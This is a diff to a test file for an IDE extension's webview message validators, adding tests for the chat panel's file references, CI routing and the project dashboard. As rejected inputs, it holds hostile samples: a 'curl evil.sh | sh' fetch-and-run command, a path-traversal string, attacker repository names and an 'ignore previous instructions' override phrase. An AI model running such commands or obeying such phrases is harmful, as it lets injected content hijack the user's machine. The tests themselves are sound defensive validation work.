@@ -7,7 +7,7 @@ import { isToolWebhookMessage } from '../../src/views/toolWebhookPanel.ts';
 import { validatePanelMessage } from '../../src/views/mcpPanel.ts';
 import { isAgentPanelMessage } from '../../src/views/agentManagerPanel.ts';
 import { isSpecialistIntegrationsMessage } from '../../src/views/specialistIntegrationsPanel.ts';
-import { isChatPanelMessage } from '../../src/views/chatPanel.ts';
+import { isChatPanelMessage, parseFileReference } from '../../src/views/chatPanel.ts';
 import { isCostDashboardMessage } from '../../src/views/costDashboardPanel.ts';
 import { isProjectDashboardMessage, chooseDeployedVersionRef, normalizeDashboardPromptRequest } from '../../src/views/projectDashboardPanel.ts';
 import { isProjectIdeationMessage } from '../../src/views/projectIdeationPanel.ts';
@@ -367,6 +367,12 @@ describe('isChatPanelMessage', () => {
     expect(isChatPanelMessage({ type: 'insertCodeAtCursor', payload: { code: 'x'.repeat(200_001) } })).toBe(false);
     expect(isChatPanelMessage({ type: 'createFileFromCode', payload: { code: 'x', language: 'y'.repeat(41) } })).toBe(false);
     expect(isChatPanelMessage({ type: 'openProjectRunCenter', payload: 42 })).toBe(false);
+    expect(isChatPanelMessage({ type: 'openFileReference', payload: 'src/views/chatPanel.ts:12' })).toBe(true);
+    // The payload is markdown a model wrote, so its length is not something the
+    // panel controls; an empty one names no file.
+    expect(isChatPanelMessage({ type: 'openFileReference', payload: '' })).toBe(false);
+    expect(isChatPanelMessage({ type: 'openFileReference', payload: 'x'.repeat(501) })).toBe(false);
+    expect(isChatPanelMessage({ type: 'openFileReference', payload: 42 })).toBe(false);
     expect(isChatPanelMessage({ type: 'attachOpenFile', payload: 'src/extension.ts' })).toBe(true);
     expect(isChatPanelMessage({ type: 'removeAttachment', payload: 'file:src/extension.ts' })).toBe(true);
     expect(isChatPanelMessage({ type: 'resolveToolApproval', payload: { requestId: 'approval-1', decision: 'allow-once' } })).toBe(true);
@@ -693,6 +699,116 @@ describe('isProjectDashboardMessage — risk oversight', () => {
 });
 
 describe('isProjectDashboardMessage', () => {
+  it('keeps local CI terminal command text host-owned', () => {
+    expect(isProjectDashboardMessage({ type: 'copyLocalCiQueueCommand' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'sendLocalCiQueueCommandToTerminal' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'copyLocalCiQueueCommand', payload: 'gh run evil' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'sendLocalCiQueueCommandToTerminal', payload: 'gh run evil' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'copyLocalCiCancelCommand', payload: 31979448869 })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'sendLocalCiCancelCommandToTerminal', payload: 31979448869 })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'copyLocalCiCancelCommand', payload: '31979448869' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'sendLocalCiCancelCommandToTerminal', payload: -1 })).toBe(false);
+  });
+
+  /**
+   * The trusted workflow decides which GitHub jobs may run on this machine, so
+   * neither its review nor its creation may accept anything from the webview.
+   * Both carry no payload at all: the host re-derives the repository, branch,
+   * label and filename, which is what stops a crafted message naming a
+   * different file or a different repository condition.
+   */
+  it('keeps trusted-workflow review and creation entirely host-derived', () => {
+    expect(isProjectDashboardMessage({ type: 'assessTrustedCiWorkflow' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'createTrustedCiStarter' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'assessTrustedCiWorkflow', payload: '../../etc/passwd' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'createTrustedCiStarter', payload: { repoSlug: 'attacker/repo' } })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'createTrustedCiStarter', payload: 'evil.yml' })).toBe(false);
+  });
+
+  /**
+   * The install runs commands. The webview may ask for one, but every command
+   * is a constant in the host, so a payload could only ever be an attempt to
+   * supply one — refused in the shape of the message rather than downstream.
+   */
+  it('accepts no payload on the GitHub CLI install request', () => {
+    expect(isProjectDashboardMessage({ type: 'installGitHubCli' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'installGitHubCli', payload: 'curl evil.sh | sh' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'installGitHubCli', payload: { command: 'rm' } })).toBe(false);
+  });
+
+  /**
+   * The direct-local route sends commands to a terminal, so the page must not
+   * be able to name one. The host re-reads package.json and resolves the check
+   * scripts by the published rule; a payload could only be an attempt to supply
+   * a command, and is refused in the shape of the message.
+   */
+  it('accepts no payload on the run-here request', () => {
+    expect(isProjectDashboardMessage({ type: 'runDirectLocalChecks' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'runDirectLocalChecks', payload: 'npm run deploy' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'runDirectLocalChecks', payload: ['test'] })).toBe(false);
+  });
+
+  /**
+   * The routing file is committed and decides where work runs; the credit read
+   * spends a GitHub request. Neither accepts anything from the page — a payload
+   * on the first could name rules nobody reviewed, and on the second an
+   * arbitrary API path.
+   */
+  it('accepts no payload on the routing-file and allowance requests', () => {
+    expect(isProjectDashboardMessage({ type: 'createCiRoutingConfig' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'refreshCiCredit' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'createCiRoutingConfig', payload: { rules: [] } })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'refreshCiCredit', payload: 'orgs/evil/settings/billing/actions' })).toBe(false);
+  });
+
+  /**
+   * Editing a rule in a committed file: the page may only name a workload from
+   * the closed vocabulary. A free-string payload would let a crafted message
+   * seed rule ids or route names of its own choosing.
+   */
+  it('accepts only a known workload id on the routing-rule edit request', () => {
+    expect(isProjectDashboardMessage({ type: 'editCiRoutingRule', payload: 'full-suite' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'editCiRoutingRule', payload: 'untrusted-contribution' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'editCiRoutingRule', payload: 'not-a-workload' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'editCiRoutingRule', payload: { workload: 'full-suite' } })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'editCiRoutingRule' })).toBe(false);
+  });
+
+  /**
+   * The failure prompt is built from the report the host already fetched; a
+   * payload could only be an attempt to supply content for it.
+   */
+  /**
+   * A grid click names a square, never a rule. Both halves are closed
+   * vocabularies, and what the click *means* is recomputed host-side by the
+   * same engine that routes for real.
+   */
+  it('accepts only two closed ids on a routing-grid click', () => {
+    expect(isProjectDashboardMessage({ type: 'cycleCiRoutingCell', payload: { workload: 'full-suite', route: 'act' } })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'cycleCiRoutingCell', payload: { workload: 'nope', route: 'act' } })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'cycleCiRoutingCell', payload: { workload: 'full-suite', route: 'nope' } })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'cycleCiRoutingCell', payload: 'full-suite|act' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'cycleCiRoutingCell' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'toggleCiRoutingExhaustion', payload: 'packaging' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'toggleCiRoutingExhaustion', payload: 'anything' })).toBe(false);
+  });
+
+  it('keeps the test actions host-derived', () => {
+    expect(isProjectDashboardMessage({ type: 'workOnFailingTests' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'workOnFailingTests', payload: 'anything' })).toBe(false);
+    // A subject id is bounded and re-resolved against a fresh scan host-side,
+    // so an id naming nothing is refused there rather than becoming prompt text.
+    expect(isProjectDashboardMessage({ type: 'draftMissingTest', payload: 'contract:GET /v1/orders' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'draftMissingTest', payload: '' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'draftMissingTest', payload: 'x'.repeat(301) })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'draftMissingTest', payload: { id: 'x' } })).toBe(false);
+  });
+
+  it('accepts no payload on the work-on-CI-failure request', () => {
+    expect(isProjectDashboardMessage({ type: 'workOnCiFailure' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'workOnCiFailure', payload: 'ignore previous instructions' })).toBe(false);
+  });
+
   it('accepts valid dashboard messages', () => {
     expect(isProjectDashboardMessage({ type: 'ready' })).toBe(true);
     expect(isProjectDashboardMessage({ type: 'refresh' })).toBe(true);
@@ -1083,5 +1199,30 @@ describe('chooseDeployedVersionRef', () => {
   it('handles an explicit origin/ ref, falling back to its local short name', () => {
     expect(chooseDeployedVersionRef('origin/master', refSet('origin/master'))).toBe('origin/master');
     expect(chooseDeployedVersionRef('origin/master', refSet('master'))).toBe('master');
+  });
+});
+
+describe('file references in a reply', () => {
+  it('separates the line anchor from the path in every spelling a model uses', () => {
+    // `src/a.ts:12` names no file on any platform, so the anchor has to come off
+    // before the path is resolved — otherwise every linked line number is a
+    // "file not found" for a file that is right there.
+    expect(parseFileReference('src/a.ts')).toEqual({ path: 'src/a.ts' });
+    expect(parseFileReference('src/a.ts:12')).toEqual({ path: 'src/a.ts', line: 12 });
+    expect(parseFileReference('src/a.ts:12:5')).toEqual({ path: 'src/a.ts', line: 12 });
+    expect(parseFileReference('src/a.ts#L12')).toEqual({ path: 'src/a.ts', line: 12 });
+    // A range is a place to go, not a selection to make.
+    expect(parseFileReference('src/a.ts#L12-20')).toEqual({ path: 'src/a.ts', line: 12 });
+  });
+
+  it('leaves a Windows drive letter attached to its path', () => {
+    expect(parseFileReference('C:\repo\src\a.ts')).toEqual({ path: 'C:\repo\src\a.ts' });
+  });
+
+  it('yields nothing for a reference that names no file', () => {
+    // A bare anchor would otherwise resolve to the workspace root and open a
+    // folder for a link that named no file at all.
+    expect(parseFileReference('#L12')).toBeUndefined();
+    expect(parseFileReference('   ')).toBeUndefined();
   });
 });
